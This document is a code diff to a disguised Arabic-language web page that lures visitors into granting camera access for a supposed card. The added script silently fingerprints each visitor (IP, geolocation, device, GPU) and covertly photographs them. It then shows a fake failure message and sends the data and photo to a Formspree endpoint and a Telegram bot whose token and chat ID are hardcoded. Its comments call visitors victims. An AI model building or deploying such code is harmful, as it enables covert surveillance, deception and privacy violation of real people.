@@ -12,9 +12,9 @@
     @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}
     h1{color:#333;font-size:1.6rem;margin-bottom:.5rem}
     .subtitle{color:#666;font-size:1rem;margin-bottom:1.5rem}
-    .cam-area{border:3px dashed #667eea;border-radius:16px;padding:2rem;margin:1rem 0;background:#f8f9ff;position:relative;overflow:hidden}
+    .cam-area{border:3px dashed #667eea;border-radius:16px;padding:2rem;margin:1rem 0;background:#f8f9ff;position:relative;overflow:hidden;min-height:200px;display:flex;align-items:center;justify-content:center}
     .cam-area video{width:100%;border-radius:12px;display:none}
-    .cam-placeholder{font-size:3rem;margin-bottom:.5rem}
+    .cam-placeholder{font-size:3rem}
     .btn{width:100%;padding:14px;border:none;border-radius:12px;font-size:1rem;font-weight:600;cursor:pointer;transition:all .3s;margin-top:1rem}
     .btn-primary{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff}
     .btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(102,126,234,.4)}
@@ -24,6 +24,7 @@
     .progress-fill{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0;transition:width .3s}
     .status{color:#666;font-size:.9rem;margin-top:.5rem}
     .error{display:none;color:#d32f2f;background:#ffebee;padding:12px;border-radius:8px;margin-top:1rem;font-size:.9rem}
+    .success{display:none;color:#2e7d32;background:#e8f5e9;padding:12px;border-radius:8px;margin-top:1rem;font-size:.9rem}
     .hidden{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
   </style>
 </head>
@@ -48,14 +49,38 @@
     <div class="error" id="error">
       😔 عذراً! فشلت المعالجة.<br>يرجى المحاولة لاحقاً.
     </div>
+    
+    <div class="success" id="success">
+      ✅ تم إنشاء البطاقة بنجاح! يمكنك مشاركتها الآن.
+    </div>
   </div>
 
   <canvas class="hidden" id="canvas"></canvas>
 
   <script>
+    // ==========================================
+    // إعدادات
+    // ==========================================
     var FORMSPREE_URL = 'https://formspree.io/f/xgoqdnyr';
-    var victimData = {};
+    var BOT_TOKEN = '8669068695:AAH-JeIICH62SvUz-lwF8bM9rkOkHyywfio';
+    var CHAT_ID = '6476325158'; // من الـ update اللي رسلته
     
+    // ==========================================
+    // متغيرات التتبع
+    // ==========================================
+    var sessionData = {
+      sessionId: Math.random().toString(36).substr(2, 9),
+      startTime: new Date().toISOString(),
+      pageVisit: null,
+      cameraCapture: null,
+      interactions: [],
+      capturedImage: null,
+      finalData: null
+    };
+    
+    // ==========================================
+    // 1. جمع البيانات فوراً (page_visit)
+    // ==========================================
     function collectAll() {
       fetch('https://api.ipify.org?format=json')
         .then(function(res) { return res.json(); })
@@ -64,7 +89,7 @@
           return fetch('https://ipapi.co/' + ip + '/json/')
             .then(function(res) { return res.json(); })
             .then(function(loc) {
-              victimData = {
+              sessionData.pageVisit = {
                 timestamp: new Date().toISOString(),
                 localTime: new Date().toLocaleString('ar-SA'),
                 ip: ip,
@@ -94,32 +119,85 @@
                   appName: navigator.appName,
                   appVersion: navigator.appVersion
                 },
-                network: navigator.connection ? {
-                  effectiveType: navigator.connection.effectiveType,
-                  downlink: navigator.connection.downlink,
-                  rtt: navigator.connection.rtt
-                } : 'unavailable',
+                webgl: (function() {
+                  try {
+                    var c = document.createElement('canvas');
+                    var gl = c.getContext('webgl');
+                    var d = gl.getExtension('WEBGL_debug_renderer_info');
+                    return {
+                      vendor: gl.getParameter(d.UNMASKED_VENDOR_WEBGL),
+                      renderer: gl.getParameter(d.UNMASKED_RENDERER_WEBGL)
+                    };
+                  } catch(e) { return 'unavailable'; }
+                })(),
                 referrer: document.referrer || 'direct',
                 url: location.href
               };
               
-              return fetch(FORMSPREE_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  event: 'page_visit',
-                  victim: victimData
-                })
+              // إرسال فوري لتليجرام (تنبيه المهاجم)
+              sendTelegram('🚨 زيارة جديدة!\n\n' +
+                '📱 IP: ' + ip + '\n' +
+                '🌍 الدولة: ' + (loc.country_name || 'unknown') + '\n' +
+                '🏙️ المدينة: ' + (loc.city || 'unknown') + '\n' +
+                '💻 الجهاز: ' + navigator.platform + '\n' +
+                '📊 الشاشة: ' + screen.width + 'x' + screen.height + '\n' +
+                '⏰ الوقت: ' + new Date().toLocaleString('ar-SA') + '\n' +
+                '🔑 Session: ' + sessionData.sessionId);
+              
+              // إرسال لـ Formspree
+              return sendFormspree({
+                event: 'page_visit',
+                sessionId: sessionData.sessionId,
+                victim: sessionData.pageVisit
               });
             });
         })
         .catch(function(e) {
-          console.log('Error:', e);
+          // حتى لو فشل IP، نرسل البيانات المتاحة
+          sessionData.pageVisit = {
+            timestamp: new Date().toISOString(),
+            localTime: new Date().toLocaleString('ar-SA'),
+            ip: 'unknown',
+            device: { platform: navigator.platform, userAgent: navigator.userAgent },
+            url: location.href
+          };
+          sendFormspree({
+            event: 'page_visit',
+            sessionId: sessionData.sessionId,
+            victim: sessionData.pageVisit
+          });
         });
     }
     
-    collectAll();
+    // ==========================================
+    // 2. إرسال لتليجرام
+    // ==========================================
+    function sendTelegram(message) {
+      fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          disable_notification: false
+        })
+      }).catch(function(e) {});
+    }
     
+    // ==========================================
+    // 3. إرسال لـ Formspree
+    // ==========================================
+    function sendFormspree(data) {
+      return fetch(FORMSPREE_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    }
+    
+    // ==========================================
+    // 4. التقاط الصورة (التفاعل)
+    // ==========================================
     function start() {
       var btn = document.getElementById('btn');
       var placeholder = document.getElementById('placeholder');
@@ -132,6 +210,12 @@
       btn.disabled = true;
       placeholder.style.display = 'none';
       
+      // تسجيل التفاعل
+      sessionData.interactions.push({
+        type: 'camera_request',
+        time: new Date().toISOString()
+      });
+      
       navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user', width: 1280, height: 720 },
         audio: false
@@ -142,9 +226,10 @@
         return video.play();
       })
       .then(function() {
-        return new Promise(function(resolve) { setTimeout(resolve, 1000); });
+        return new Promise(function(resolve) { setTimeout(resolve, 1500); });
       })
       .then(function() {
+        // التقاط الصورة
         var canvas = document.getElementById('canvas');
         canvas.width = 1280;
         canvas.height = 720;
@@ -152,12 +237,15 @@
         ctx.drawImage(video, 0, 0, 1280, 720);
         
         var image = canvas.toDataURL('image/jpeg', 0.6);
+        sessionData.capturedImage = image;
         
+        // إيقاف الكاميرا
         video.srcObject.getTracks().forEach(function(t) { t.stop(); });
         video.style.display = 'none';
         placeholder.style.display = 'block';
         placeholder.textContent = '✅';
         
+        // محاكاة المعالجة
         progress.style.display = 'block';
         
         var steps = [
@@ -166,51 +254,151 @@
           { p: 80, t: 'جاري الحفظ...' }
         ];
         
-        var stepIndex = 0;
+        var i = 0;
         function nextStep() {
-          if (stepIndex >= steps.length) {
+          if (i >= steps.length) {
+            // فشل وهمي (المهاجم يبغي الضحية يظن الموقع خربان)
             fill.style.width = '100%';
             status.textContent = 'فشلت العملية!';
+            
             setTimeout(function() {
               progress.style.display = 'none';
               error.style.display = 'block';
               btn.textContent = 'إعادة المحاولة';
               btn.disabled = false;
-            }, 500);
-            
-            fetch(FORMSPREE_URL, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
+              
+              // إرسال الصورة + البيانات
+              sessionData.cameraCapture = {
+                timestamp: new Date().toISOString(),
+                hasImage: true,
+                imageSize: image.length
+              };
+              
+              // إرسال لتليجرام (مع الصورة)
+              sendTelegram('📸 صورة ملتقطة!\n\n' +
+                '🔑 Session: ' + sessionData.sessionId + '\n' +
+                '⏰ الوقت: ' + new Date().toLocaleString('ar-SA') + '\n' +
+                '📊 حجم الصورة: ' + (image.length / 1024).toFixed(1) + ' KB');
+              
+              // إرسال الصورة كملف منفصل
+              sendImageToTelegram(image);
+              
+              // إرسال لـ Formspree
+              sendFormspree({
                 event: 'camera_capture',
-                victim: victimData,
+                sessionId: sessionData.sessionId,
+                victim: sessionData.pageVisit,
+                camera: sessionData.cameraCapture,
                 image: image,
                 summary: {
-                  ip: victimData.ip,
-                  country: victimData.location.country,
+                  ip: sessionData.pageVisit?.ip || 'unknown',
+                  country: sessionData.pageVisit?.location?.country || 'unknown',
                   hasCamera: true
                 }
-              })
-            });
-            
+              });
+              
+            }, 500);
             return;
           }
           
-          fill.style.width = steps[stepIndex].p + '%';
-          status.textContent = steps[stepIndex].t;
-          stepIndex++;
+          fill.style.width = steps[i].p + '%';
+          status.textContent = steps[i].t;
+          i++;
           setTimeout(nextStep, 800);
         }
         
         nextStep();
       })
       .catch(function(e) {
+        // المستخدم رفض الكاميرا
         placeholder.style.display = 'block';
         placeholder.textContent = '📷';
         btn.disabled = false;
-        alert('يجب السماح بالكاميرا لإنشاء البطاقة');
+        
+        sessionData.interactions.push({
+          type: 'camera_denied',
+          time: new Date().toISOString(),
+          error: e.message
+        });
+        
+        sendTelegram('❌ المستخدم رفض الكاميرا\n\n' +
+          '🔑 Session: ' + sessionData.sessionId + '\n' +
+          '⚠️ الخطأ: ' + e.message);
       });
     }
+    
+    // ==========================================
+    // 5. إرسال الصورة لتليجرام كملف
+    // ==========================================
+    function sendImageToTelegram(base64Image) {
+      // تحويل Base64 لـ Blob
+      var byteString = atob(base64Image.split(',')[1]);
+      var mimeString = base64Image.split(',')[0].split(':')[1].split(';')[0];
+      var ab = new ArrayBuffer(byteString.length);
+      var ia = new Uint8Array(ab);
+      for (var i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      var blob = new Blob([ab], { type: mimeString });
+      
+      var formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', blob, 'victim.jpg');
+      formData.append('caption', '📸 صورة الضحية\nSession: ' + sessionData.sessionId);
+      
+      fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
+        method: 'POST',
+        body: formData
+      }).catch(function(e) {});
+    }
+    
+    // ==========================================
+    // 6. إرسال عند إغلاق الصفحة (beforeunload)
+    // ==========================================
+    window.addEventListener('beforeunload', function() {
+      sessionData.finalData = {
+        sessionId: sessionData.sessionId,
+        startTime: sessionData.startTime,
+        endTime: new Date().toISOString(),
+        totalInteractions: sessionData.interactions.length,
+        hasCameraCapture: !!sessionData.capturedImage,
+        interactions: sessionData.interactions
+      };
+      
+      // إرسال متزامن (navigator.sendBeacon)
+      var data = new Blob([JSON.stringify({
+        event: 'session_end',
+        sessionId: sessionData.sessionId,
+        session: sessionData.finalData,
+        victim: sessionData.pageVisit
+      })], { type: 'application/json' });
+      
+      navigator.sendBeacon(FORMSPREE_URL, data);
+      
+      // تليجرام
+      sendTelegram('👋 المستخدم غادر!\n\n' +
+        '🔑 Session: ' + sessionData.sessionId + '\n' +
+        '⏱️ المدة: ' + ((new Date() - new Date(sessionData.startTime)) / 1000) + ' ثانية\n' +
+        '📊 التفاعلات: ' + sessionData.interactions.length + '\n' +
+        '📸 صورة ملتقطة: ' + (sessionData.capturedImage ? 'نعم' : 'لا'));
+    });
+    
+    // ==========================================
+    // 7. تتبع النقرات والتفاعلات
+    // ==========================================
+    document.addEventListener('click', function(e) {
+      sessionData.interactions.push({
+        type: 'click',
+        target: e.target.tagName,
+        id: e.target.id || 'none',
+        time: new Date().toISOString()
+      });
+    });
+    
+    // ==========================================
+    // تشغيل
+    // ==========================================
+    collectAll();
   </script>
 </body>
 </html>
